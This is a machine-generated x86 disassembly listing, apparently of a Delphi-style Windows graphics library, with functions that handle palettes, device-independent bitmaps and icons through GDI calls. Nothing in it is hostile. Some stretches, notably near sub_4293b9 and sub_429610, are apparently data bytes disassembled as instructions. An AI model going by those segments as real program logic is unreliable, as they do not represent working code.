mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_428826
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_428838
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4029b0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_428630
mov eax esp
call sub_4287a0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4288dc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_428630
mov [ esp ] eax
sub_428930
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4282d8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_4282b8
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_428adc
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_428148
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428a02
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_428158
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a09
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_42804c
sub_428a09
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4282d8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_428148
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428abc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_428158
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428ac3
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_428af8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_428b88
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_408084
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_428e7f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_428c71
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_42804c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c78
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_428c78
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_428aec
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_408084
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_428e5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_428930
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_408084
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_428e3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428e43
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4027d4
retn
call sub_4280a0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_428aec
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_428af8
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_428ea8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_428028
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402da4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4282d8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_428f8c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_428ea8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_428ff8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_428ea8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_429095
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42909c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4290cc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402da4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402da4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4290c0
xor edx edx
push ebp
push sub_4292ba
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_428f8c
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_428f8c
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_429293
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_408084
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_408084
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_408084
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_408084
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_428ff8
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_428ff8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42929a
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4027d4
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4027d4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4027d4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4027d4
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_42929a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292c1
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_4292c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_429318
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_429370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_429318
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4293b9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4032d8
mov edi eax
mov eax esi
call sub_4032d8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4294f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4294d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4081b0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4294dd
mov al 0x1
sub_42950c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41e058
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429554
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42955b
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_429560
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_429594
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41e058
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4295df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4295e6
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_429610
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
mov esp 0x2c0041b8
mov ch 0x41
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
add [ eax + 0x100041b5 ] ch
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
test [ esi + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
xchg esi eax
inc edx
add [ eax ] dl
add [ eax ] al
add ah bl
mov es [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add ah bl
xchg edi eax
inc edx
add [ esi + esi * 4 + 0x41 ] bh
add [ eax + edi * 4 - 0x4ad3ffbf ] bh
inc ecx
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
hlt
mov edx r-xdata
mov eax esi
call sub_429828
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_429828
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_429828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42978c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_429785
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403360
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_429828
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_4036f4
sub_4296a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_429785
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403360
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_429828
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_429828
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_429828
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_429828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42978c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
add esp 0xfffffff0
call sub_4036f4
sub_429828
push ebp
mov ebp esp
